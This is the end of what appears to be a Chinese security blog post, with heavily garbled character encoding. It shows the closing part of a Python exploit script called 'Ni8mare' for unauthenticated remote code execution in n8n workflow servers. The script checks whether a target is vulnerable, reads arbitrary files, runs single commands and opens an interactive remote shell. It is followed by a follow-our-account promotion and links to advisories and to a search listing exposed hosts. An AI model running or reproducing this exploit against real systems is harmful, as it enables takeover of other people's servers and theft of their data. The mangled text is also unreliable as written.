Â  Â  Â  Â  p.failure("Failed")Â  Â  Â  Â  return
Â  Â  p.success("OK")Â  Â  print(f"\n{out}")defÂ run_shell(exploit: Ni8mare) ->Â None:
Â  Â  log.info("Interactive mode (type 'exit' to quit)")Â  Â  whileÂ True:Â  Â  Â  Â  try:
Â  Â  Â  Â  Â  Â  cmd =Â input("\033[91mn8n\033[0m> ").strip()Â  Â  Â  Â  exceptÂ (EOFError, KeyboardInterrupt):Â  Â  Â  Â  Â  Â  print()Â  Â  Â  Â  Â  Â  returnÂ  Â  Â  Â  ifÂ notÂ cmdÂ orÂ cmd ==Â "exit":Â  Â  Â  Â  Â  Â  return
Â  Â  Â  Â  out = exploit.rce(cmd)Â  Â  Â  Â  ifÂ out:Â  Â  Â  Â  Â  Â  print(out)defÂ main():Â  Â  print(BANNER)
Â  Â  args = parse_args()

Â  Â  exploit = Ni8mare(args.url, args.form)
Â  Â  version, vuln = exploit.get_version()
Â  Â  log.info(f"Target:Â {exploit.form_url}")
Â  Â  log.info(f"Version:Â {version}Â ({'VULN'Â ifÂ vulnÂ elseÂ 'SAFE'})")Â  Â  ifÂ args.read:
Â  Â  Â  Â  run_read(exploit, args.read, args.output)Â  Â  Â  Â  returnÂ  Â  ifÂ notÂ exploit.pwn():Â  Â  Â  Â  returnÂ  Â  ifÂ args.cmd:
Â  Â  Â  Â  run_cmd(exploit, args.cmd)Â  Â  Â  Â  return

Â  Â  run_shell(exploit)ifÂ __name__ ==Â "__main__":
Â  Â  main()

```  
  
ğŸ””Â **æƒ³è¦è·å–æ›´å¤šç½‘ç»œå®‰å…¨ä¸ç¼–ç¨‹æŠ€æœ¯å¹²è´§ï¼Ÿ**  
  
å…³æ³¨Â **æ³·ç¾½Sec-é™å®‰**  
Â å…¬ä¼—å·ï¼Œä¸ä½ ä¸€èµ·æ¢ç´¢å‰æ²¿æŠ€æœ¯ï¼Œåˆ†äº«å®ç”¨çš„å­¦ä¹ èµ„æºä¸å·¥å…·ã€‚æˆ‘ä»¬ä¸“æ³¨äºæ·±å…¥åˆ†æï¼Œæ‹’ç»æµ®èºï¼Œåªåšæœ€å®ç”¨çš„æŠ€æœ¯åˆ†äº«ï¼ğŸ’»  
  
é©¬ä¸ŠåŠ å…¥æˆ‘ä»¬ï¼Œå…±åŒæˆé•¿ï¼ğŸŒŸ  
  
ğŸ‘‰Â **é•¿æŒ‰æˆ–æ‰«æäºŒç»´ç å…³æ³¨å…¬ä¼—å·**  
  
ç›´æ¥å›å¤æ–‡ç« ä¸­çš„å…³é”®è¯ï¼Œè·å–æ›´å¤šæŠ€æœ¯èµ„æ–™ä¸ä¹¦å•æ¨èï¼ğŸ“š  
#### å¼•ç”¨é“¾æ¥  
  
[1]  
Â https://www.online-python.com/ï¼‰å®Œæˆï¼Œä¸éœ€è¦æœ¬åœ°å®‰è£…ä»»ä½•å·¥å…·ã€‚:Â https://www.online-python.com/%EF%BC%89%E5%AE%8C%E6%88%90%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%BB%BB%E4%BD%95%E5%B7%A5%E5%85%B7%E3%80%82[2]  
Â Cyera Research - Ni8mare Full Write-up:Â https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858[3]  
Â GHSA-v4pr-fm98-w9pg:Â https://github.com/n8n-io/n8n/security/advisories/GHSA-v4pr-fm98-w9pg[4]  
Â GHSA-v98v-ff95-f3cp:Â https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp[5]  
Â Nuclei Template CVE-2025-68613:Â https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-68613.yaml[6]  
Â LeakIX Search Results:Â https://leakix.net/search?scope=leak&q=%2Btag%3Acve-2026-21858[7]  
Â Formidable:Â https://github.com/node-formidable/formidable  
  
Â   
  
  
